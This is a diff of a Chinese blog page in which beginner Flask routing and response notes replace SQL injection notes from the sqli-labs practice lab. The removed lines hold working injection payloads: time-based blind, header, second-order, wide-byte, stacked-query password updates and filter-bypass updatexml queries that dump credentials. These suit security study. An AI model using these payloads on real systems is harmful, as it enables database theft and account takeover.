-<p>**if()**函数<br>if(1,2,3)函数与PHP中三元运算符类似，当1中语句为真时执行2中语句，否则执行3中语句。</p>
-<p>**sleep()**函数<br>sleep(3)即休息3秒，所以当语句被执行时加载时间会多三秒</p>
+<p>这个就是对传入参数有一定限制，规定一下类型</p>
+<p><strong>4.请求方法</strong></p>
+<p>Flask 路由支持不同的 HTTP 请求方法，如 GET、POST、PUT、DELETE 等。可以通过 methods 参数指定允许的请求方法。</p>
+<p>实例:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get_params&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_params</span>():</span><br><span class="line">    <span class="comment"># 获取单个参数</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    age = request.args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">    <span class="comment"># 如果参数不存在，get 方法会返回 None，也可以指定默认值</span></span><br><span class="line">    city = request.args.get(<span class="string">&#x27;city&#x27;</span>, <span class="string">&#x27;Unknown&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Name: <span class="subst">&#123;name&#125;</span>, Age: <span class="subst">&#123;age&#125;</span>, City: <span class="subst">&#123;city&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p> 代码解释</p>
+<ul>
+<li><code>request.args</code> 是一个类似字典的对象，用于存储 URL 查询字符串中的参数。</li>
+<li><code>request.args.get(&#39;name&#39;)</code> 用于获取名为 <code>name</code> 的参数值，如果该参数不存在，返回 <code>None</code>。</li>
+<li><code>request.args.get(&#39;city&#39;, &#39;Unknown&#39;)</code> 表示如果 <code>city</code> 参数不存在，将返回默认值 <code>&#39;Unknown&#39;</code>。</li>
+</ul>
+<p>这是通过GET请求获得参数。至于POST请求</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/post_form&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_form</span>():</span><br><span class="line">    <span class="comment"># 获取单个参数</span></span><br><span class="line">    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    age = request.form.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">    city = request.form.get(<span class="string">&#x27;city&#x27;</span>, <span class="string">&#x27;Unknown&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Name: <span class="subst">&#123;name&#125;</span>, Age: <span class="subst">&#123;age&#125;</span>, City: <span class="subst">&#123;city&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>无法通过url获得参数。直接访问会出现下面这样，其他方法还难一点</p>
+
+
+<p>这是GET请求</p>
+
+
+
+
+<p><strong>5.路由转换器</strong></p>
+<p>Flask 提供了一些内置的转换器，可以对 URL 中的参数进行特定类型的转换。</p>
+<p>常用转换器：</p>
+<ul>
+<li><strong><code>int</code>：</strong> 匹配整数。</li>
+<li><strong><code>float</code>：</strong> 匹配浮点数。</li>
+<li><strong><code>path</code>：</strong> 匹配任意路径，包括斜杠。</li>
+</ul>
+<p>话说这个也是相当于对参数的强制类型转换，为什么不放在路由规划前面讲</p>
 <p>实例：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(ascii(substr(database(),1,1))&gt;110,sleep(5),0) --+</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/items/&lt;int:item_id&gt;/details&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">item_details</span>(<span class="params">item_id</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Item details for item ID: <span class="subst">&#123;item_id&#125;</span>&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p>通过if()与sleep()结合判断出具体名字</p>
-<p>其他的以后看见再补充吧</p>
-<h3 id="4-HTTP头注入"><a href="#4-HTTP头注入" class="headerlink" title="4.HTTP头注入"></a>4.HTTP头注入</h3><p>常见的sql注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方</p>
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/c0b65deaa50f811b943a1c1e1395ec7d.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/c0b65deaa50f811b943a1c1e1395ec7d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="img">
-
-<p><strong>产生注入的条件</strong>：</p>
-<p>- 能够对请求头消息进行修改</p>
-<p>- 修改的请求头信息能够带入数据库进行查询</p>
-<p>- 数据库没有对输入的请求信息做过滤</p>
-<p>HTTP头注入需要抓包，我使用的抓包软件为<strong>burp suite</strong>很好用，就是有点难装和配置。</p>
-<h4 id="1-User-Agent注入"><a href="#1-User-Agent注入" class="headerlink" title="1.User-Agent注入"></a>1.User-Agent注入</h4><p> User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等。（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等然后将其存入数据库中）。这里获取User-Agent就可以知道客户都是通过什么浏览器访问系统的，然后将其值保存到数据库中。</p>
-<p>这里开始有难度了，于是引入实例：sqli-labs less-18 </p>
-<p><strong>注入点判断</strong></p>
-<p>我们在尝试完其他方法后，基本可以确定使用HTTP头注入，我们可以在user-agent值后面加上’，引发报错，确定存在sql注入</p>
-<p>我们可以根据报错内容完成闭环，然后再使用其他注入手法</p>
-<p><strong>注意事项</strong></p>
-<p>sqli-labs less-18 的PHP源代码中先核实了账号与密码再进行 user-agent 的注入，所以必须先输对账号和密码才可以进行注入</p>
-<p>本关无法在表单提交中注入是因为对输入内容进行了转义处理<br>即：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>实例界面：</p>
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/image-20250118164453778.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/image-20250118164453778.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="image-20250118164453778">
-
-<h4 id="2-referer注入"><a href="#2-referer注入" class="headerlink" title="2.referer注入"></a>2.referer注入</h4><p><strong>Referer：</strong>是HTTP header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。</p>
-<p>除了注入点的改变，其他和user-agent注入一样。</p>
-<h4 id="3-cookie注入"><a href="#3-cookie注入" class="headerlink" title="3.cookie注入"></a>3.cookie注入</h4><p> cookie：服务器端用来记录客户端的状态。由服务端产生，保存在浏览器中。</p>
-<p>也是除了注入点其他都一样</p>
-<h3 id="5-二阶注入"><a href="#5-二阶注入" class="headerlink" title="5.二阶注入"></a>5.二阶注入</h3><p>二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与—次注入攻击漏洞相同的攻击威力。</p>
-<p>1.黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。</p>
-<p>2.服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</p>
-<p>3.黑客向服务端发送第二个与第一次不相同的请求数据信息。</p>
-<p>4.服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。</p>
-<p>5.服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功</p>
-<p>总结，二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行。</p>
-<p>即在第一次以数据储存的形式将特殊语句储存，再在第二次请求时与第一次储存的语句发生作用，形成注入。</p>
-<p><strong>sqli-labs less-24</strong></p>
-<ol>
-<li>如下点击注册用户</li>
-</ol>
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/f15e1f7471a1d7e2f893b553d04ad09e.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/f15e1f7471a1d7e2f893b553d04ad09e.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="img">
-
-<p>这里注册用户名为 admin’#</p>
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/78b128c6672b93985b16f80b0f039b44.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/78b128c6672b93985b16f80b0f039b44.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="img">
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line"><span class="comment">//因为我们的username为admin&#x27;#</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line"><span class="comment">//导致用户名识别为admin,我们也就可以更改admin的密码</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="6-宽字节注入"><a href="#6-宽字节注入" class="headerlink" title="6.宽字节注入"></a>6.宽字节注入</h3><p>宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。在之前的注入过程中我们会遇到下面语句：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//之前我们遇到默认不可注入</span></span><br></pre></td></tr></table></figure>
-
-<p>这条语句将经过我们注入的语句使用函数进行转义</p>
-<p><strong>mysql_real_escape_string()</strong></p>
-<p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
-<p>下列字符受影响：</p>
 <ul>
-<li>\x00</li>
-<li>\n</li>
-<li>\r</li>
-<li>\</li>
-<li>‘</li>
-<li>“</li>
-<li>\x1a</li>
+<li><code>&lt;int:item_id&gt;</code>：将 URL 中的 <code>item_id</code> 转换为整数。</li>
 </ul>
-<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
-<p>也就是说，我们用来形成闭合的’，”会被<strong>转义</strong>(即在前面添加<strong>\</strong> ，导致只作为字符出现，不行使语法作用)，这么一来，我们之前的所有注入方法似乎都不可行了，于是便要使用宽字节注入</p>
-<p>我们要绕过这个转义处理，使单引号发挥作用不再被转义，有两个思路：</p>
-<ol>
-<li>让斜杠（\）失去作用</li>
-<li>让斜杠（\）消失</li>
-</ol>
-<p>第一个思路就是借鉴程序员的防范思路，对斜杠（\）转义，使其失去转义单引号的作用，成为普通的内容。第二个思路就是宽字节注入。</p>
-<p><strong>关于编码</strong></p>
-<p>在理解宽字节注入之前，我们需要先了解编码的有关知识，关于什么是编码，为什么要编码。</p>
-<ol>
-<li><p>某字符的大小为一个字节时，称其字符为窄字节.</p>
-</li>
-<li><p>当某字符的大小为两个字节时，称其字符为宽字节.</p>
-</li>
-<li><p>所有英文默认占一个字节，汉字占两个字节</p>
-</li>
-<li><p>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等</p>
-</li>
-</ol>
-<p><strong>宽字节注入</strong>       </p>
-<p>宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。转义函数在对这些编码进行转义时会将转义字符 ‘\’ 转为 %5c ,于是我们在他前面输入一个单字符编码与它组成一个新的多字符编码，使得原本的转义字符没有发生作用。</p>
-<p>  由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字（前一个ascii码要大于128，才到汉字的范围）。然后mysql服务器会对查询语句进行GBK编码，即下面所说的</p>
-<p>   我们在前面加上 %df’  ,转义函数会将%df’改成%df\’ , 而\ 就是%5c ，即最后变成了%df%5c’，而%df%5c在GBK中这两个字节对应着一个汉字 “運” ，就是说 \ 已经失去了作用，%df ‘ ,被认为運’ ,成功消除了转义函数的影响。</p>
+<p><strong>6.路由函数返回</strong></p>
+<p>视图函数可以返回多种类型的响应：</p>
 <ul>
-<li>‘           %27</li>
-<li>\           %5c</li>
-<li>%df&#39;    %df%5c’ -&gt;  運’</li>
+<li><strong>字符串</strong>：返回纯文本响应。</li>
+<li><strong>HTML</strong>：返回 HTML 页面。</li>
+<li><strong>JSON</strong>：返回 JSON 数据。</li>
+<li><strong>Response 对象</strong>：自定义响应</li>
 </ul>
-<p>也就是说在’前面添加%df，可以和\合并组成汉字从而让\消失</p>
-<p>我们通过宽字符让单个符号恢复后，还不能解决所有问题，比如</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br><span class="line">#我们使用宽字符注入的结果为</span><br><span class="line">table_name<span class="operator">=</span>運<span class="string">&#x27;users運&#x27;</span></span><br><span class="line">#这会导致表名变得无法查询</span><br></pre></td></tr></table></figure>
+<p>实例:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify, Response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/json&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_response</span>():</span><br><span class="line">    data = &#123;<span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;value&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> jsonify(data)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/custom&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_response</span>():</span><br><span class="line">    response = Response(<span class="string">&#x27;Custom response with headers&#x27;</span>, status=<span class="number">200</span>)</span><br><span class="line">    response.headers[<span class="string">&#x27;X-Custom-Header&#x27;</span>] = <span class="string">&#x27;Value&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
 
-<p>面对上述情况我们可以依靠sql语句识别16进制的特性，将字符串转为16进制，不需要引号包裹，可以绕过PHP代码中的转义，但需要在16进制编码前面添加0x象征16进制</p>
-<p>比如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">talbe_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br><span class="line">table_name<span class="operator">=</span><span class="number">0x656d61696c73</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>POST宽字节注入</strong></p>
-<p>我以为已经结束了，没想到上面的全是关于<strong>GET</strong>请求的方法，于是POST它来了</p>
-<p>因为post 请求不经过URL编码，所以我们无法通过识别%df&#x2F;为汉字，但是也有解决办法，即通过有些汉字为三字节，我们可以在前面添加’汉’等二字节字符来和&#x2F;组成三字节汉字来绕过转义</p>
-<h3 id="7-堆叠查询"><a href="#7-堆叠查询" class="headerlink" title="7.堆叠查询"></a>7.堆叠查询</h3><p>堆叠查询也叫堆叠注入，在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p>
-<p><strong>也就是说，这是一个大漏洞了，只要完成闭合在添加一个分号，我们就可以自己写执行的sql语句了。</strong></p>
-<p>这一切都来自此函数：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)</span><br><span class="line"><span class="comment">//可以在$sql中写多条sql语句用分号隔开即可</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">123456</span><span class="string">&#x27; where id=1; --+ </span></span><br></pre></td></tr></table></figure>
-
-<p>意思就是再更新id&#x3D;1的用户密码为123456。如下成功执行了更新密码的语句</p>
-<img src="/2025/01/12/sql%E6%B3%A8%E5%85%A5/88cf0eb770424ad86ca0951cc7e05a84.png" class="lazyload" data-srcset="/2025/01/12/sql%E6%B3%A8%E5%85%A5/88cf0eb770424ad86ca0951cc7e05a84.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" class=" lazyload" title="img">
-
-
-
-<h2 id="4-过滤绕过"><a href="#4-过滤绕过" class="headerlink" title="4.过滤绕过"></a>4.过滤绕过</h2><p>即在注入语句时，有些会将我注入语句中 ：and ,or ,#,–,空格…等符号进行替换为空</p>
-<p><strong>当单词被过滤时</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	</span><br><span class="line"><span class="comment">//通过正则表达式找出$id中的&#x27;or&#x27; 然后通过preg_replace()函数将其替换为空</span></span><br><span class="line"><span class="comment">//正则表达式中&#x27;i&#x27;指的是不区分大小写，如果没有i就可以使用大小写绕过</span></span><br><span class="line"><span class="comment">//我可以通过&#x27;oorr&#x27;和&#x27;anandd&#x27;这种形式，让内部的or和and被替换然后剩余部分继续拼接成or与and</span></span><br><span class="line"><span class="comment">//单词中的也需要注意，如information应写成infoorrmation</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-2</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
-
-<p>不得不说，为什么less-25中’#’,’–qwq’不可以用，但’–+’可以用</p>
-<p><strong>当空格被过滤时</strong></p>
-<p>第二十六关将逻辑运算符，注释符以及空格给过滤了，我们需要使用单引号进行闭合，双写绕过逻辑运算符或者使用&amp;&amp;和||替换。空格绕过网上找了些资料，对于绕过空格限制有大把的方式对于空格，有较多的方法：%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格，我在windows和kali里面都用不了，可能是因为apache解析不了。只能使用()绕过。报错注入空格使用比较少所以我们可以使用报错注入。</p>
-<p>过滤代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br></pre></td></tr></table></figure>
-
-<p>没空格的报错注入：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;</span>security<span class="string">&#x27;))),1))||&#x27;</span><span class="number">0</span>   爆表</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#x27;</span>security<span class="string">&#x27;aandnd(table_name=&#x27;</span>users<span class="string">&#x27;)))),1))||&#x27;</span><span class="number">0</span>     爆字段</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">?id=<span class="number">1</span><span class="string">&#x27;||(updatexml(1,concat(0x7e,(select(group_concat(passwoorrd,username))from(users))),1))||&#x27;</span><span class="number">0</span>   爆密码账户</span><br><span class="line"><span class="comment">//这里只能用||,我个人认为当使用&amp;&amp;时会导致id=0(即后面条件为假，返回0)导致报错</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>当注释符被过滤时</strong></p>
-<p>即我们无法直接通过注释符注释掉形成闭环后多出来的闭合符，于是我们可以通过输入</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">//这样就可以在不影响前面条件对错的情况下将多余的&#x27;</span>变得不多于</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>相应的,其他闭合符就全部进行替换即可</span><br></pre></td></tr></table></figure>
-
-<p><strong>当逗号被过滤时</strong></p>
-<p>在此之前我们需要学习MySQL语句中join的用法</p>
-<p><strong>join的用法</strong></p>
-<p>SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。</p>
-<p>最常见的 JOIN 类型：<strong>SQL INNER JOIN（简单的 JOIN）</strong>。 SQL INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。</p>
-<p>语法：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table1</span><br><span class="line"><span class="keyword">JOIN</span> table2 <span class="keyword">ON</span> <span class="keyword">condition</span>;</span><br><span class="line">#<span class="keyword">condition</span> 即代表两个表的拼接方式</span><br></pre></td></tr></table></figure>
-
-<p><strong>参数说明：</strong></p>
 <ul>
-<li>**column1, column2, …**：要选择的字段名称，可以为多个字段。如果不指定字段名称，则会选择所有字段。</li>
-<li><strong>table1</strong>：要连接的第一个表。</li>
-<li><strong>table2</strong>：要连接的第二个表。</li>
-<li><strong>condition</strong>：连接条件，用于指定连接方式</li>
+<li><code>jsonify(data)</code>：将字典转换为 JSON 响应。</li>
+<li><code>Response(&#39;Custom response with headers&#39;, status=200)</code>：创建自定义响应对象。</li>
 </ul>
-<p><strong>join</strong>有很多种用法，我们只需用到常用的一种即可</p>
+<p><strong>静态文件和模板</strong></p>
+<p>我们之前有这么一串代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br></pre></td></tr></table></figure>
+
+<p>这是将此文件作为Flask的模板，我们也可以引入其他文件作为模板</p>
+<p>静态文件（如 CSS、JavaScript、图片）可以通过 static 路由访问。模板文件则通过 templates 文件夹组织，用于渲染 HTML 页面。</p>
+<p>静态文件访问:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;style.css&#x27;) &#125;&#125;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这和文件包含类似，相当于包含了style.css文件</p>
+<p>实例:</p>
